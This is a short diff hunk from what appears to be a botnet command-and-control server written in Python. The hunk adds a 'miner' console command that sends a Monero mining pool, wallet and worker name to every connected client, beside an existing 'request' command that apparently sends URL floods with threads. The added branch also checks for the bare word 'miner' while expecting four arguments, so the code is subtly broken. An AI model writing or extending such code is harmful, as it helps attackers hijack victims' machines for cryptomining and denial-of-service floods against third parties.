@@ -174,6 +174,13 @@ def server():
                         else:
                             print("Usage: request <http(s)://example.com> <threads>\n")
 
+                    elif console == "miner":
+                        if len(console.split()) == 4:
+                            for client in clients:
+                                client.sendall(console.encode())
+                        else:
+                            print("Usage: miner <pool:port> <monero_wallet> <worker_name>")
+
                     elif console == "connect":
                         print("\033[31m[-]\033[0m You are already connected\n")
 
